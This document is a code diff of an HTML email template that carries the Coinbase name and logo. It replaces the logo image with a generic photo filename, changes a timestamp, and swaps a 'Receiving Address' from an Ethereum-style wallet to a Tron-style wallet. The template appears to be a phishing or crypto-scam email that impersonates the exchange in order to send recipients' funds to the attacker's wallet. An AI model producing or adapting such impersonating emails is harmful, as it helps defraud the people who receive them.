@@ -16,7 +16,7 @@
                        <!-- Header -->
  
   <td align="center" style="padding: 20px;">
-              <img src="original-c92588b6febf13096fab468625d79f3c~2.png" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" />
+<img src="IMG_0523.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" />
             </td>
           </tr>
 
@@ -59,7 +59,7 @@
  <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="font-size:14px; color:#333; background-color:#f2f6fa; border-radius:6px; margin:20px 0;">
                 <tr>
                   <td style="padding:10px;"><strong>Time stamp:</strong></td>
-                  <td style="padding:10px;">2025-04-22 23:59:59 UTC</td>
+                  <td style="padding:10px;">may/24/2025</td>
                 </tr>
                 <tr>
                   <td style="padding:10px;"><strong>Health:</strong></td>
@@ -79,7 +79,7 @@
                 </tr>
   <tr>
                   <td style="padding:10px;"><strong>Receiving Address:</strong></td>
-                  <td style="padding:10px;">0x554f3cA80f5A46B1ba1F63b73271452260F739A</td>
+                  <td style="padding:10px;">TUAVAdUQ5R569CSD5jn3mbUtszXLn6ovM3</td>
                 </tr> 
               </table>
               
